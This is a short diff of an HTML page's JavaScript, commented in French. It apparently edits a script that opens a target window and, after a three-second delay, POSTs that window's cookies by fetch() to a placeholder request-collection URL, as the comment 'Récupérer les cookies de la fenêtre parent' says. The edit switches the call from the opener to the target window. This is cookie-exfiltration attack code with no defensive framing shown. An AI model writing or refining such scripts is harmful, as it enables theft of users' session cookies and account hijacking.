@@ -17,7 +17,7 @@
         if (targetWindow) {
           try {
             // Récupérer les cookies de la fenêtre parent
-            targetWindow.opener.fetch('https://your-requestbin-url.com', {
+            targetWindow.fetch('https://your-requestbin-url.com', {
               method: 'POST',
               headers: {
                 'Content-Type': 'application/x-www-form-urlencoded',
@@ -30,7 +30,7 @@
         } else {
           console.error("Impossible d'ouvrir la fenêtre cible.");
         }
-      }, 3000); // Délai de 3 secondes pour s'assurer que la fenêtre se charge
+      }, 3000);
     };
   </script>
 </body>
